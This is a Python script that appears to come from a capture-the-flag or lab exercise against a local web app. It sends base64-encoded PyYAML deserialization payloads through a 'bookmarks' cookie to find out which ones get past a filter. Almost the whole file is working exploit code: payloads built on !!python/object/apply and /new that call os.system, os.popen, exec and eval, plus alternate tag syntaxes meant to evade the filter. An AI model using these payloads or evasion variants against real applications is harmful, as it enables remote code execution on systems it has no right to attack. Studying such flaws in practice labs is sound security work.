import requests
import base64

target = "http://127.0.0.1:32979"

# Let's first test what definitely SHOULD be blocked vs what passes
# Based on memory, !!python/object/apply:os.system should be blocked

test_payloads = [
    # Should be blocked (500)
    ("Direct os.system apply", """!!python/object/apply:os.system
- "id"
"""),
    
    # Should be blocked  
    ("Direct os.popen with !!python/object/apply", """!!python/object/apply:os.popen
- "id"
"""),
    
    # Should pass but no exec (based on context)
    ("os.popen with new", """!!python/object/new:os.popen
args:
  - "id"
"""),
    
    # Test basic UrlObj format
    ("Normal UrlObj", """!!python/object:app.models.UrlObj
name: test
url: https://test.com
"""),

    # Try different syntax variations that might exec
    ("import + exec", """!!python/object/new:__builtin__.exec
args:
  - "import os; os.system('id')"
"""),
    
    ("direct eval", """!!python/object/apply:__builtin__.eval
- "__import__('os').system('id')"
"""),
    
    # Try the actual YAML syntax that PyYAML uses internally
    ("tag:yaml.org,2002:python/object/apply", """!<tag:yaml.org,2002:python/object/apply:os.system> id
"""),
    
    # Alternative apply syntax
    ("apply shorthand", """!<python/object/apply:os.system> "id"
"""),
]

session = requests.Session()

print("Investigating filter behavior...")
print("="*60)

for name, yaml_data in test_payloads:
    encoded = base64.b64encode(yaml_data.encode()).decode()
    cookies = {"bookmarks": encoded}
    
    resp = session.get(target, cookies=cookies, timeout=10)
    
    print(f"\n[name: {name}]")
    print(f"  Status: {resp.status_code}")
    print(f"  Length: {len(resp.text)} bytes")
    
    # Check if bookmarks are being parsed and displayed
    if "test" in resp.text.lower() or "bookmark" in resp.text.lower():
        print(f"  Bookmarks section detected in response")
    
    # Show first 500 chars of response
    print(f"  Response preview (first 500 chars):")
    print(resp.text[:500])
    print("-" * 40)

